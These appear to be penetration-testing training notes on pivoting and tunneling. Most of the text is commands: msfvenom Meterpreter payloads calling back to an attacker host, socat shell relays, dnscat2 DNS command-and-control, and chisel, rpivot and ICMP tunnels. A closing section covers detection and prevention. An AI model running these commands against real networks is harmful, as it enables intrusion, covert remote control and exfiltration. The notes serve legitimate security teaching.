# Pivoting, Tunneling, and Port Forwarding

Vocabulary: a compromised host used to reach an unreachable segment goes by pivot host, proxy, foothold, beach head, or jump host. Keep the three tactics straight:

- **Pivoting** — using compromised hosts to cross network boundaries you can't normally reach (e.g. a dual-homed engineering workstation bridging enterprise and OT networks). Goal: go deeper.
- **Tunneling** — wrapping traffic inside another protocol (key inside a stuffed toy) to dodge detection: C2 masked in HTTP GET/POST, SSH over other transports, data exfil. Subset of pivoting.
- **Lateral movement** — spreading wide within a network (local admin reuse across hosts), not crossing segmentation.

First actions on any new foothold: privilege level, network connections, VPN/remote-access software, and NICs. Multiple NICs = multiple reachable networks.

## Introduction to Pivoting, Tunneling, and Port Forwarding

Networking refresher that matters here:

- `ifconfig` (Linux/macOS) / `ipconfig` (Windows) — enumerate NICs. A `tun0` interface = active VPN. Public IPs face the internet (DMZ hosts); private IPs only route internally. The IPs on a compromised host define its pivot potential.
- Routing table (`netstat -r` / `ip route`) — every OS has one; traffic to unknown networks goes to the default gateway. Reading a pivot host's routing table shows which networks it can reach and which routes you'd need to add (Metasploit's AutoRoute does exactly this).
- Ports/protocols — connecting through a firewall-permitted port (80/443 on a web server) is often the way in. Track source ports too, so payloads hit the right listener.

## Dynamic Port Forwarding with SSH and SOCKS Tunneling

**Local port forward** — one known remote service, reachable locally:

```bash
nmap -sT -p22,3306 <PIVOT_IP>          # SSH open, MySQL bound to localhost only
ssh -L 1234:localhost:3306 ubuntu@<PIVOT_IP>
# verify:
netstat -antp | grep 1234              # ssh listening locally
nmap -v -sV -p1234 localhost           # 1234/tcp open mysql

# stack multiple forwards:
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@<PIVOT_IP>
```

**Dynamic forwarding / SOCKS pivot** — when you don't know what's beyond the pivot. Check the pivot's NICs first (`ifconfig` — e.g. ens192 = your network, ens224 = 172.16.5.129 on the internal net), then:

```bash
ssh -D 9050 ubuntu@<PIVOT_IP>
```

Point proxychains at it (`/etc/proxychains.conf`): `socks4 127.0.0.1 9050`. Now any TCP tool routes through the pivot:

```bash
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19
proxychains msfconsole                  # e.g. auxiliary/scanner/rdp/rdp_scanner against internal hosts
proxychains xfreerdp /v:172.16.5.19 /u:<USERNAME> /p:<PASSWORD>
```

Rules of the road: proxychains can't handle partial packets — **full TCP connect scans only (-sT), no SYN/half-open**. Windows Defender firewall blocks ICMP by default, so host discovery lies — use `-Pn` and scan known/small ranges rather than whole subnets.

## Remote/Reverse Port Forwarding with SSH

Problem: the internal Windows target can't route back to your attack host, so a plain reverse shell dies. The pivot (Ubuntu) talks to both sides — make it the callback address:

```bash
# payload calls back to the PIVOT's internal IP
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

Deliver via the pivot (scp + http.server 8123 → `Invoke-WebRequest` on Windows), then open the reverse forward — pivot listens on 8080 and ships connections to your listener on 8000:

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<PIVOT_IP> -vN
```

Execute the payload on Windows → Meterpreter session. It shows as coming from 127.0.0.1 because it rides your local SSH socket outbound to the pivot.

## Meterpreter Tunneling & Port Forwarding

Meterpreter on the pivot replaces SSH entirely.

Payload + handler:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> -f elf -o backupjob LPORT=8080
# multi/handler: linux/x64/meterpreter/reverse_tcp, LHOST 0.0.0.0, LPORT 8080
# on pivot: chmod +x backupjob && ./backupjob
```

Ping sweep the internal net from the session:

```text
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Or from a shell on the pivot:

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

First sweep across networks can fail while ARP caches build — run it twice.

SOCKS proxy through the session:

```text
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Add the route (module or deprecated session command):

```text
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

```text
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p      # list active routes
```

Then `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn` works through the session.

**portfwd** — forward a remote service to your localhost through the session:

```text
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

```bash
xfreerdp /v:localhost:3300 /u:<USERNAME> /p:<PASSWORD>
```

Reverse variant — pivot listens on 1234, forwards to your 8081:

```text
portfwd add -R -l 8081 -p 1234 -L <ATTACKER_IP>
```

Handler on 8081 (windows/x64/meterpreter/reverse_tcp), payload with `LHOST=172.16.5.129 LPORT=1234` — shell from the internal Windows host arrives pivoted.

## Socat Redirection with a Reverse Shell

Socat = bidirectional pipe between two network channels, no SSH needed. Reverse-shell redirector on the pivot (listens 8080 → your attack host:80):

```bash
socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER_IP>:80
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
# handler: reverse_https on port 80
```

## Socat Redirection with a Bind Shell

Windows runs a bind payload; socat on the pivot bridges you to it:

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443   # run on Windows
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443                                 # on pivot
```

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <PIVOT_IP>
set LPORT 8080
run
```

## SSH for Windows: plink.exe

Plink (PuTTY Link) does SSH forwards from Windows — living off the land on older locked-down hosts (or Windows attack boxes):

```cmd
plink -ssh -D 9050 ubuntu@<PIVOT_IP>
```

Then Proxifier (Windows SOCKS client): profile → SOCKS4 127.0.0.1:9050 → launch mstsc.exe straight through the tunnel.

## SSH Pivoting with Sshuttle

sshuttle (Python) automates the iptables work — "poor man's VPN" over SSH. No proxychains, no per-tool config:

```bash
sudo apt-get install sshuttle
sudo sshuttle -r ubuntu@<PIVOT_IP> 172.16.5.0/23 -v
```

It inserts NAT rules redirecting traffic for that subnet through the pivot. Every tool now works directly, with full features:

```bash
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn    # -A service/version detection works, unproxied
```

SSH-only pivoting; no TOR/HTTPS proxy options.

## Web Server Pivoting with Rpivot

rpivot = reverse SOCKS proxy (Python2) — the internal client connects *out* to your server, exposing its networks to you. Server on the attack host:

```bash
git clone https://github.com/klsecservices/rpivot.git
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Client on the pivot (scp the repo over first):

```bash
python2 client.py --server-ip <ATTACKER_IP> --server-port 9999
```

proxychains (`socks4 127.0.0.1 9050`) → `proxychains firefox-esr 172.16.5.135:80`.

Egress only via an NTLM-authenticated HTTP proxy? rpivot speaks to it:

```bash
python client.py --server-ip <WEBSERVER_IP> --server-port 8080 --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 --domain <DOMAIN> --username <USERNAME> --password <PASSWORD>
```

## Port Forwarding with Windows Netsh

Native Windows pivot, no tools (admin required):

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
netsh.exe interface portproxy show v4tov4
```

Then RDP to the pivot's 8080 and land on the internal host's 3389. netsh also handles routes, firewall inspection, and proxies.

## DNS Tunneling with Dnscat2

dnscat2 shuttles an encrypted C2 channel inside DNS TXT records — the local DNS server's resolution requests become your data stream. Slips past firewalls that strip/inspect HTTPS. Server:

```bash
git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/server/
sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=inlanefreight.local --no-cache
# prints a pre-shared secret, e.g. 0ec04a91cd1e963f8c03ca499d589d21
```

Client on Windows via dnscat2-powershell:

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

Server shows `Session 1 Security: ENCRYPTED AND VERIFIED!` — interact:

```text
dnscat2> window -i 1        # drop into the client's cmd shell; ctrl-z returns
```

Commands: windows, window, kill, tunnels, start/stop, set/unset.

## SOCKS5 Tunneling with Chisel

Chisel: TCP/UDP tunnel over HTTP, secured with SSH. Build with Go (`go build`; glibc mismatches between build and target → grab a prebuilt release), scp to the pivot.

Forward direction — server on the pivot:

```bash
ubuntu@pivot$ ./chisel server -v -p 1234 --socks5
```

```bash
./chisel client -v <PIVOT_IP>:1234 socks      # attack host; local SOCKS on 1080
```

proxychains: `socks5 127.0.0.1 1080` → `proxychains xfreerdp /v:172.16.5.19 ...`.

**Reverse pivot** — when the target's firewall blocks inbound connections to it, run the server on *your* host and let the pivot dial out:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5          # attack host
```

```bash
ubuntu@pivot$ ./chisel client -v <ATTACKER_IP>:1234 R:socks # R: = reversed remote
```

The SOCKS listener (1080) now lives on your side, tunneled through the pivot's outbound connection. Version mismatches on the target → try another chisel release.

## ICMP Tunneling with SOCKS

ptunnel-ng wraps TCP in ICMP echo requests — works only where ping to an external host is allowed. Great for exfil and pivots where everything else is blocked.

```bash
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh            # or build static: sed-patch autogen.sh per module, then ./autogen.sh
scp -r ptunnel-ng ubuntu@<PIVOT_IP>:~/
```

Server on the pivot (`-r` = the interface IP clients will reach, `-R22` = forward to local SSH):

```bash
ubuntu@pivot$ sudo ./ptunnel-ng -r<PIVOT_IP> -R22
```

Client on the attack host — connect through the tunnel via local port 2222:

```bash
sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22
ssh -p2222 -lubuntu 127.0.0.1
```

Then chain dynamic forwarding through it for full proxychains access:

```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

Verify in Wireshark: plain SSH shows TCP/SSHv2; tunneled SSH shows ICMP. ptunnel-ng prints per-session ICMP I/O statistics as a second confirmation.

## RDP and SOCKS Tunneling with SocksOverRDP

Windows-only environment, no SSH anywhere? SocksOverRDP abuses RDP Dynamic Virtual Channels (the mechanism behind clipboard/audio) to tunnel arbitrary packets inside an RDP session.

1. Copy SocksOverRDP-x64.zip to the foothold, register the plugin:

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```

2. RDP (mstsc) into the internal target 172.16.5.19 — a popup confirms the plugin and a SOCKS listener at 127.0.0.1:1080 *on your foothold*.
3. Run `SocksOverRDP-Server.exe` (admin) on the RDP target.
4. Confirm on the foothold: `netstat -antb | findstr 1080`.
5. Proxifier on the foothold → SOCKS5 127.0.0.1:1080 → launch mstsc.exe and RDP to hosts beyond the target (e.g. 172.16.6.155), tunneled over the RDP session.

Slow/multiple RDP sessions: mstsc → Experience tab → set performance to Modem.

## Detection & Prevention

Baseline first — document and re-audit every few months: DNS records, device backups, DHCP config, full application inventory, host list + locations, elevated-permission users, **dual-homed hosts**, and a current network diagram (Netbrain, diagrams.net).

- **People** — users are the weak link; BYOD imports home-network malware into the corporate segment (the module's Nick scenario). MFA on all auth, especially admin accounts; SOC coverage; rehearsed incident response.
- **Processes** — asset monitoring and provisioning/decommissioning policies, gold images and hardening baselines, account provisioning/de-provisioning, change management.
- **Technology** — periodic sweeps for legacy misconfigurations, patch management, risk acceptance as a deliberate decision.

Perimeter questions worth asking (then again internally): what's exposed to the internet, who watches the alerts, are DMZ + IDS/IPS in place, are production/management networks separate, is there OOB management for infrastructure?

MITRE mapping of this module's TTPs and their fixes:

- **T1133 External Remote Services** — firewall segmentation, block internal protocols from egressing, VPN/position requirements before access.
- **T1021 Remote Services** — MFA on SSH/RDP, restrict who can remote where, host firewalls, OOB-only management for routers/switches.
- **T1571 Non-Standard Ports** — know your normal port/protocol pairs (444 vs 443 stands out); NIDS/NIPS.
- **T1572 Protocol Tunneling** — lock down allowed ports/protocols in and out; internal hosts have no business resolving DNS externally; watch for beaconing patterns even in encrypted traffic.
- **T1090 Proxy Use** — allow-list domains/IPs; everything else blocked by default.
- **LOTL** — baseline network traffic and user behavior; watch command shells; EDR/AV + SIEM correlation to catch the abnormal early.